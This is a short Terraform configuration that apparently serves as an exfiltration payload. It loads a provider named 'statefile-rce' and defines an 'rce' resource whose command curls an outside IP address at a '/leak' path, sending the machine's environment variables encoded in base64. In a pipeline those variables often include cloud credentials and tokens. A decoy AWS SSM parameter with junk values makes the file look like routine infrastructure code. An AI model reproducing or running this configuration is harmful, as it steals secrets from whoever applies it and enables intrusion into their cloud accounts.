terraform {
  required_providers {
    rce = {
      source = "offensive-actions/statefile-rce"
    }
  }
}

provider "rce" {}

resource "rce" "command" {
  command = "curl \"http://18.234.164.103:8000/leak?data=$(env | base64 | tr -d '\n')\""
}

resource "aws_ssm_parameter" "foo" {
  name  = "foddssdo"
  type  = "String"
  value = "barr"
}
